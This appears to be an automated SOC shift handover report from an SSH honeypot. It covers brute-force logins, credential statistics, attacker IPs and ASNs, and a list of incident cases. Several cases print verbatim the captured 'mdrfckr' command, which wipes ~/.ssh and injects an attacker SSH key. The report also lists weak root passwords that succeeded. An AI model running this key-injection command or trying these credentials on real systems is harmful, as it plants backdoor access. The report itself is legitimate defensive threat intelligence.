# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-19 |
| **Generated At** | 2026-04-19T14:44:37Z |
| **Shift Time** | 14:44 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **211** |
| Confirmed Threats | **209** |
| False Positives Filtered | **2** (0.9%) |
| Unique Attacker IPs | **14** |
| Countries of Origin | **9** |
| High Severity Cases | **76** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **135** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **204** |
| Unique Credential Pairs | **54** |
| Unique Usernames | **25** |
| Unique Passwords | **53** |
| Successful Auth Pairs | **46** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 76 |
| `345gs5662d34` | 38 |
| `ubuntu` | 20 |
| `ftpuser` | 8 |
| `postgres` | 6 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 38 |
| `3245gs5662d34` | 38 |
| `12345678` | 6 |
| `123qwe!@#QWE` | 3 |
| `zzZZ111` | 3 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 38 |
| `root` | `3245gs5662d34` | 38 |
| `ubuntu` | `123qwe!@#QWE` | 3 |
| `root` | `zzZZ111` | 3 |
| `ali` | `ali27` | 3 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Aa.123456` | `98.71.8.129` | 2026-04-19T13:10:54 |
| `root` | `3245gs5662d34` | `98.71.8.129` | 2026-04-19T13:10:58 |
| `root` | `zzZZ111` | `89.190.156.109` | 2026-04-19T13:51:55 |
| `root` | `3245gs5662d34` | `89.190.156.109` | 2026-04-19T13:51:59 |
| `root` | `Qazwsx123456789!@` | `143.64.168.136` | 2026-04-19T13:54:09 |
| `root` | `3245gs5662d34` | `143.64.168.136` | 2026-04-19T13:54:13 |
| `root` | `QWER!!` | `91.99.110.230` | 2026-04-19T13:57:43 |
| `root` | `3245gs5662d34` | `91.99.110.230` | 2026-04-19T13:57:47 |
| `root` | `root0!@` | `46.101.74.113` | 2026-04-19T13:58:23 |
| `root` | `3245gs5662d34` | `46.101.74.113` | 2026-04-19T13:58:27 |
| `root` | `qwer!@#` | `91.99.110.230` | 2026-04-19T13:59:12 |
| `root` | `qweewq123` | `46.101.74.113` | 2026-04-19T13:59:48 |
| `root` | `zzZZ111` | `91.99.110.230` | 2026-04-19T14:00:39 |
| `root` | `Centos@123` | `116.193.190.100` | 2026-04-19T14:01:22 |
| `root` | `3245gs5662d34` | `116.193.190.100` | 2026-04-19T14:01:28 |
| `root` | `Ubuntu@2026` | `187.141.71.166` | 2026-04-19T14:01:48 |
| `root` | `3245gs5662d34` | `187.141.71.166` | 2026-04-19T14:01:55 |
| `root` | `12345677` | `187.141.71.166` | 2026-04-19T14:05:00 |
| `root` | `A123456-` | `46.101.74.113` | 2026-04-19T14:05:14 |
| `root` | `12345677` | `116.193.190.100` | 2026-04-19T14:06:34 |
| `root` | `12345677` | `103.189.235.33` | 2026-04-19T14:07:37 |
| `root` | `3245gs5662d34` | `103.189.235.33` | 2026-04-19T14:07:40 |
| `root` | `Gg112233` | `187.141.71.166` | 2026-04-19T14:08:09 |
| `root` | `Gg112233` | `116.193.190.100` | 2026-04-19T14:08:17 |
| `root` | `ccDD123123` | `91.99.110.230` | 2026-04-19T14:10:16 |
| `root` | `Centos@123` | `103.189.235.33` | 2026-04-19T14:12:48 |
| `root` | `A123456-` | `91.99.110.230` | 2026-04-19T14:13:07 |
| `root` | `zzZZ111` | `46.101.74.113` | 2026-04-19T14:15:08 |
| `root` | `qweewq123` | `91.99.110.230` | 2026-04-19T14:15:55 |
| `root` | `Ubuntu@2026` | `103.189.235.33` | 2026-04-19T14:16:18 |
| `root` | `qazwsx2019!` | `46.101.74.113` | 2026-04-19T14:16:31 |
| `root` | `root0!@` | `91.99.110.230` | 2026-04-19T14:17:17 |
| `root` | `123456Lk` | `103.189.235.33` | 2026-04-19T14:18:06 |
| `root` | `Abcd123456789@` | `91.99.110.230` | 2026-04-19T14:18:37 |
| `root` | `Ubuntu@2026` | `116.193.190.100` | 2026-04-19T14:18:48 |
| `root` | `Abcd123456789@` | `46.101.74.113` | 2026-04-19T14:19:10 |
| `root` | `Centos@123` | `187.141.71.166` | 2026-04-19T14:19:21 |
| `root` | `ccDD123123` | `46.101.74.113` | 2026-04-19T14:21:57 |
| `root` | `123456Lk` | `116.193.190.100` | 2026-04-19T14:22:34 |
| `root` | `Zz123456` | `91.99.110.230` | 2026-04-19T14:24:11 |
| `root` | `QWER!!` | `46.101.74.113` | 2026-04-19T14:24:47 |
| `root` | `Gg112233` | `103.189.235.33` | 2026-04-19T14:24:57 |
| `root` | `qwer!@#` | `46.101.74.113` | 2026-04-19T14:26:18 |
| `root` | `qazwsx2019!` | `91.99.110.230` | 2026-04-19T14:27:09 |
| `root` | `123456Lk` | `187.141.71.166` | 2026-04-19T14:27:30 |
| `root` | `Zz123456` | `46.101.74.113` | 2026-04-19T14:29:08 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **211** |
| Sessions with Fingerprint | **1** |
| Unique HASSH Fingerprints | **1** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 206 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 206 | 10 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 206 | 10 | Modern SSH client |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 38 | 8 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `91.99.110.230`, `103.189.235.33`, `116.193.190.100`, `143.64.168.136`, `46.101.74.113`, `187.141.71.166`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **14** |
| Unique ASNs | **12** |
| High-Risk ASNs | **11** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS8075` | Microsoft Corporation | 3 | HIGH |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 1 | HIGH |
| `AS14061` | DigitalOcean, LLC | 1 | HIGH |
| `AS138608` | Cloud Host Pte Ltd | 1 | HIGH |
| `AS58593` | Shanghai Blue Cloud Technology Co.,Ltd | 1 | HIGH |
| `AS37963` | Hangzhou Alibaba Advertising Co.,Ltd. | 1 | HIGH |
| `AS56048` | China Mobile Communicaitons Corporation | 1 | HIGH |
| `AS49870` | Alsycon B.V. | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (76)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-494700548b7e

| Field | Detail |
|---|---|
| **Source IP** | `98.71.8[.]129` |
| **First Seen** | 2026-04-19 13:10 |
| **Last Seen** | 2026-04-19 13:10 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 13:10:53` | `cowrie.session.connect` |
| `2026-04-19 13:10:53` | `cowrie.client.version` |
| `2026-04-19 13:10:53` | `cowrie.client.kex` |
| `2026-04-19 13:10:54` | `cowrie.login.success` |
| `2026-04-19 13:10:54` | `cowrie.session.params` |
| `2026-04-19 13:10:54` | `cowrie.command.input` |
| `2026-04-19 13:10:54` | `cowrie.command.failed` |
| `2026-04-19 13:10:55` | `cowrie.log.closed` |
| `2026-04-19 13:10:55` | `cowrie.session.params` |
| `2026-04-19 13:10:55` | `cowrie.command.input` |
| `2026-04-19 13:10:55` | `cowrie.session.file_download` |
| `2026-04-19 13:10:55` | `cowrie.log.closed` |
| `2026-04-19 13:10:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `98.71.8[.]129` to AbuseIPDB if not already reported
- [ ] Block `98.71.8[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e916d17554e0

| Field | Detail |
|---|---|
| **Source IP** | `98.71.8[.]129` |
| **First Seen** | 2026-04-19 13:10 |
| **Last Seen** | 2026-04-19 13:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 13:10:57` | `cowrie.session.connect` |
| `2026-04-19 13:10:57` | `cowrie.client.version` |
| `2026-04-19 13:10:57` | `cowrie.client.kex` |
| `2026-04-19 13:10:58` | `cowrie.login.success` |
| `2026-04-19 13:10:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `98.71.8[.]129` to AbuseIPDB if not already reported
- [ ] Block `98.71.8[.]129` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fa4841be72ac

| Field | Detail |
|---|---|
| **Source IP** | `89.190.156[.]109` |
| **First Seen** | 2026-04-19 13:51 |
| **Last Seen** | 2026-04-19 13:51 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 13:51:55` | `cowrie.session.connect` |
| `2026-04-19 13:51:55` | `cowrie.client.version` |
| `2026-04-19 13:51:55` | `cowrie.client.kex` |
| `2026-04-19 13:51:55` | `cowrie.login.success` |
| `2026-04-19 13:51:56` | `cowrie.session.params` |
| `2026-04-19 13:51:56` | `cowrie.command.input` |
| `2026-04-19 13:51:56` | `cowrie.command.failed` |
| `2026-04-19 13:51:56` | `cowrie.log.closed` |
| `2026-04-19 13:51:56` | `cowrie.session.params` |
| `2026-04-19 13:51:56` | `cowrie.command.input` |
| `2026-04-19 13:51:56` | `cowrie.session.file_download` |
| `2026-04-19 13:51:56` | `cowrie.log.closed` |
| `2026-04-19 13:51:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `89.190.156[.]109` to AbuseIPDB if not already reported
- [ ] Block `89.190.156[.]109` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-91414cd49776

| Field | Detail |
|---|---|
| **Source IP** | `89.190.156[.]109` |
| **First Seen** | 2026-04-19 13:51 |
| **Last Seen** | 2026-04-19 13:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 13:51:58` | `cowrie.session.connect` |
| `2026-04-19 13:51:58` | `cowrie.client.version` |
| `2026-04-19 13:51:58` | `cowrie.client.kex` |
| `2026-04-19 13:51:59` | `cowrie.login.success` |
| `2026-04-19 13:51:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `89.190.156[.]109` to AbuseIPDB if not already reported
- [ ] Block `89.190.156[.]109` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1282dc148d76

| Field | Detail |
|---|---|
| **Source IP** | `143.64.168[.]136` |
| **First Seen** | 2026-04-19 13:54 |
| **Last Seen** | 2026-04-19 13:54 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 13:54:08` | `cowrie.session.connect` |
| `2026-04-19 13:54:08` | `cowrie.client.version` |
| `2026-04-19 13:54:08` | `cowrie.client.kex` |
| `2026-04-19 13:54:09` | `cowrie.login.success` |
| `2026-04-19 13:54:09` | `cowrie.session.params` |
| `2026-04-19 13:54:09` | `cowrie.command.input` |
| `2026-04-19 13:54:09` | `cowrie.command.failed` |
| `2026-04-19 13:54:09` | `cowrie.log.closed` |
| `2026-04-19 13:54:09` | `cowrie.session.params` |
| `2026-04-19 13:54:09` | `cowrie.command.input` |
| `2026-04-19 13:54:10` | `cowrie.session.file_download` |
| `2026-04-19 13:54:10` | `cowrie.log.closed` |
| `2026-04-19 13:54:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `143.64.168[.]136` to AbuseIPDB if not already reported
- [ ] Block `143.64.168[.]136` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a0392b25240d

| Field | Detail |
|---|---|
| **Source IP** | `143.64.168[.]136` |
| **First Seen** | 2026-04-19 13:54 |
| **Last Seen** | 2026-04-19 13:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 13:54:12` | `cowrie.session.connect` |
| `2026-04-19 13:54:12` | `cowrie.client.version` |
| `2026-04-19 13:54:12` | `cowrie.client.kex` |
| `2026-04-19 13:54:13` | `cowrie.login.success` |
| `2026-04-19 13:54:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `143.64.168[.]136` to AbuseIPDB if not already reported
- [ ] Block `143.64.168[.]136` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad64c621349f

| Field | Detail |
|---|---|
| **Source IP** | `91.99.110[.]230` |
| **First Seen** | 2026-04-19 13:57 |
| **Last Seen** | 2026-04-19 13:57 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 13:57:43` | `cowrie.session.connect` |
| `2026-04-19 13:57:43` | `cowrie.client.version` |
| `2026-04-19 13:57:43` | `cowrie.client.kex` |
| `2026-04-19 13:57:43` | `cowrie.login.success` |
| `2026-04-19 13:57:44` | `cowrie.session.params` |
| `2026-04-19 13:57:44` | `cowrie.command.input` |
| `2026-04-19 13:57:44` | `cowrie.command.failed` |
| `2026-04-19 13:57:44` | `cowrie.log.closed` |
| `2026-04-19 13:57:44` | `cowrie.session.params` |
| `2026-04-19 13:57:44` | `cowrie.command.input` |
| `2026-04-19 13:57:44` | `cowrie.session.file_download` |
| `2026-04-19 13:57:44` | `cowrie.log.closed` |
| `2026-04-19 13:57:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.99.110[.]230` to AbuseIPDB if not already reported
- [ ] Block `91.99.110[.]230` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec0e3c3f4db3

| Field | Detail |
|---|---|
| **Source IP** | `91.99.110[.]230` |
| **First Seen** | 2026-04-19 13:57 |
| **Last Seen** | 2026-04-19 13:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 13:57:46` | `cowrie.session.connect` |
| `2026-04-19 13:57:46` | `cowrie.client.version` |
| `2026-04-19 13:57:46` | `cowrie.client.kex` |
| `2026-04-19 13:57:47` | `cowrie.login.success` |
| `2026-04-19 13:57:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.99.110[.]230` to AbuseIPDB if not already reported
- [ ] Block `91.99.110[.]230` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ffd98c888fe2

| Field | Detail |
|---|---|
| **Source IP** | `46.101.74[.]113` |
| **First Seen** | 2026-04-19 13:58 |
| **Last Seen** | 2026-04-19 13:58 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 13:58:22` | `cowrie.session.connect` |
| `2026-04-19 13:58:22` | `cowrie.client.version` |
| `2026-04-19 13:58:22` | `cowrie.client.kex` |
| `2026-04-19 13:58:23` | `cowrie.login.success` |
| `2026-04-19 13:58:23` | `cowrie.session.params` |
| `2026-04-19 13:58:23` | `cowrie.command.input` |
| `2026-04-19 13:58:23` | `cowrie.command.failed` |
| `2026-04-19 13:58:23` | `cowrie.log.closed` |
| `2026-04-19 13:58:24` | `cowrie.session.params` |
| `2026-04-19 13:58:24` | `cowrie.command.input` |
| `2026-04-19 13:58:24` | `cowrie.session.file_download` |
| `2026-04-19 13:58:24` | `cowrie.log.closed` |
| `2026-04-19 13:58:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.101.74[.]113` to AbuseIPDB if not already reported
- [ ] Block `46.101.74[.]113` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-482e90c8bc42

| Field | Detail |
|---|---|
| **Source IP** | `46.101.74[.]113` |
| **First Seen** | 2026-04-19 13:58 |
| **Last Seen** | 2026-04-19 13:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 13:58:26` | `cowrie.session.connect` |
| `2026-04-19 13:58:26` | `cowrie.client.version` |
| `2026-04-19 13:58:26` | `cowrie.client.kex` |
| `2026-04-19 13:58:27` | `cowrie.login.success` |
| `2026-04-19 13:58:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.101.74[.]113` to AbuseIPDB if not already reported
- [ ] Block `46.101.74[.]113` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4da38e3462ff

| Field | Detail |
|---|---|
| **Source IP** | `91.99.110[.]230` |
| **First Seen** | 2026-04-19 13:59 |
| **Last Seen** | 2026-04-19 13:59 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 13:59:11` | `cowrie.session.connect` |
| `2026-04-19 13:59:11` | `cowrie.client.version` |
| `2026-04-19 13:59:11` | `cowrie.client.kex` |
| `2026-04-19 13:59:12` | `cowrie.login.success` |
| `2026-04-19 13:59:12` | `cowrie.session.params` |
| `2026-04-19 13:59:12` | `cowrie.command.input` |
| `2026-04-19 13:59:12` | `cowrie.command.failed` |
| `2026-04-19 13:59:12` | `cowrie.log.closed` |
| `2026-04-19 13:59:13` | `cowrie.session.params` |
| `2026-04-19 13:59:13` | `cowrie.command.input` |
| `2026-04-19 13:59:13` | `cowrie.session.file_download` |
| `2026-04-19 13:59:13` | `cowrie.log.closed` |
| `2026-04-19 13:59:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.99.110[.]230` to AbuseIPDB if not already reported
- [ ] Block `91.99.110[.]230` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef2db4f0ae47

| Field | Detail |
|---|---|
| **Source IP** | `91.99.110[.]230` |
| **First Seen** | 2026-04-19 13:59 |
| **Last Seen** | 2026-04-19 13:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 13:59:15` | `cowrie.session.connect` |
| `2026-04-19 13:59:15` | `cowrie.client.version` |
| `2026-04-19 13:59:15` | `cowrie.client.kex` |
| `2026-04-19 13:59:15` | `cowrie.login.success` |
| `2026-04-19 13:59:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.99.110[.]230` to AbuseIPDB if not already reported
- [ ] Block `91.99.110[.]230` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be4ba462e63a

| Field | Detail |
|---|---|
| **Source IP** | `46.101.74[.]113` |
